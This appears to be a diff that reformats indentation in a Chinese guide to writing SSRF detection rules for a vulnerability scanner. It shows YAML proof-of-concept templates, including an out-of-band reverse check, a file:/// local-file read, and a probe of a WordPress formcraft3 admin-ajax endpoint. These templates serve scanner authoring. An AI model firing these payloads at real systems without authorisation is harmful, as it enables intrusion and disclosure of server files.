@@ -14,19 +14,19 @@ title: 'SSRF'
 name: poc-yaml-ssrf-reverse
 transport: http
 set:
-	reverse: newReverse()
-	reverseURL: reverse.url
+    reverse: newReverse()
+    reverseURL: reverse.url
 rules:
-	r0:
-		request:
-			cache: true
-			method: POST
-			path: /xxx
-			headers:
-				Content-Type: application/json
-			body: |
-				{"content": "include:\n remote: {{reverseURL}}"}
-		expression: response.status == 200 && reverse.wait(5)
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /xxx
+            headers:
+                Content-Type: application/json
+            body: |
+                {"content": "include:\n remote: {{reverseURL}}"}
+        expression: response.status == 200 && reverse.wait(5)
 ```
 
 ## 有回显情况（Revealed）
@@ -37,17 +37,17 @@ rules:
 
 ```yaml
 r0:
-	request:
-		cache: true
-		method: POST
-		path: /xxx
-		headers:
-			Content-Type: application/x-www-form-urlencoded
-		body: |
-			url=file:///{{filename}}
-		follow_redirects: false
-	expression: |
-		response.status == 500 && response.body.bcontains(b"\"exception\":\"java.io.FileNotFoundException\",")
+    request:
+        cache: true
+        method: POST
+        path: /xxx
+        headers:
+            Content-Type: application/x-www-form-urlencoded
+        body: |
+            url=file:///{{filename}}
+        follow_redirects: false
+    expression: |
+        response.status == 500 && response.body.bcontains(b"\"exception\":\"java.io.FileNotFoundException\",")
 ```
 
 使用协议读取文件时，可以尝试去读取系统中存在的文件或者不存在的文件，依据response的内容与状态写出对应的匹配表达式即可
@@ -56,12 +56,12 @@ r0:
 
 ```yaml
 r0:
-	request:
-		cache: true
-		method: GET
-		path: /xxx/http/example.com
-		follow_redirects: true
-	expression: response.status == 200 && response.body.bcontains(b"<title>Example Domain</title>") && response.body.bcontains(b"<h1>Example Domain</h1>")
+    request:
+        cache: true
+        method: GET
+        path: /xxx/http/example.com
+        follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"<title>Example Domain</title>") && response.body.bcontains(b"<h1>Example Domain</h1>")
 ```
 
 <Warning>当访问外部站点时，一定需要注意的是能够访问的只是`公共站点`，一定不要请求一些私有项目的公开页面或者文件</Warning>
@@ -74,13 +74,13 @@ r0:
 
 ```yaml
 r0:
-	request:
-		cache: true
-		method: GET
-		path: /wp-admin/admin-ajax.php?action=formcraft3_get&URL=http://127.0.0.1:0
-		follow_redirects: false
-	expression: |
-		response.status == 200 && response.body.bcontains(b"cURL error 3: ") && response.body.bcontains(b"failed")
+    request:
+        cache: true
+        method: GET
+        path: /wp-admin/admin-ajax.php?action=formcraft3_get&URL=http://127.0.0.1:0
+        follow_redirects: false
+    expression: |
+        response.status == 200 && response.body.bcontains(b"cURL error 3: ") && response.body.bcontains(b"failed")
 ```
 
 这个例子说明了通过访问本地地址来验证SSRF漏洞的存在。一般这种情况下
